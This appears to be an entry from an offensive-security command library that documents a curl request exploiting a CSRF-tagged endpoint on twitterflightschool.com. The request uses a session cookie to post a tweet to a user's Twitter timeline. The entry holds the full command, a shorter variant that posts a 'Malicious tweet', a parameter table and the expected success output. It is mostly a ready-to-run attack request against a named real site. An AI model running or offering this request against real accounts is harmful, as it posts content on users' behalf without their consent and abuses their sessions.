---
id: ce838684-75a0-45e0-88a4-5c55a2bf0f2d
name: post-to-twitter-timeline
type: command
executor: bash
data: >-
  curl -X POST https://twitterflightschool.com/api/twitter/upload -H "Cookie:
  connect.sid=████████" -H "Content-Type: application/x-www-form-urlencoded" -d
  "text=This bird’s gotta fly! #TwitterFlightSchool completed. Learn about
  Twitter ads at:
  https://twitterflightschool.com&url=/assets/gifs/l.gif&body=[object
  Object]&_id=56abc0ed22d87b9d6a64a4c2&__v=0&createdAt=2016-01-29T19%3A43%3A41.223Z&updatedAt=2016-01-29T19%3A43%3A41.223Z"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.778Z'
platforms:
  - Web
tags:
  - csrf
  - twitter
verified: false
validated: true
submitted: true
---

# post-to-twitter-timeline

## Command

```bash
curl -X POST https://twitterflightschool.com/api/twitter/upload \
  -H "Cookie: connect.sid=████████" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "text=This bird’s gotta fly! #TwitterFlightSchool completed. Learn about Twitter ads at: https://twitterflightschool.com&url=/assets/gifs/l.gif&body=[object Object]&_id=56abc0ed22d87b9d6a64a4c2&__v=0&createdAt=2016-01-29T19%3A43%3A41.223Z&updatedAt=2016-01-29T19%3A43%3A41.223Z"
```

## Description

This curl command simulates a CSRF exploit by posting a message to the user's Twitter timeline via the vulnerable /api/twitter/upload endpoint, using a valid session cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Cookie: ..."` | Injects session cookie for authentication | Yes |
| `-H "Content-Type: ..."` | Sets form-encoded content type | Yes |
| `-d "text=...&url=..."` | Payload with tweet text, URL, body, IDs, and timestamps | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://twitterflightschool.com/api/twitter/upload -H "Cookie: connect.sid=████████" -d "text=Malicious tweet&url=/assets/gifs/l.gif"
```

### Advanced Usage

Include full parameters as in the main command for complete replication.

## Expected Output

HTTP 200 OK with JSON response indicating successful upload, e.g., {"success": true, "tweetId": "..."}; tweet appears on Twitter.

## Related

- [[procedures/Exploit-CSRF-to-Post-on-Twitter-Timeline]]
- [[commands/update-user-profile]]
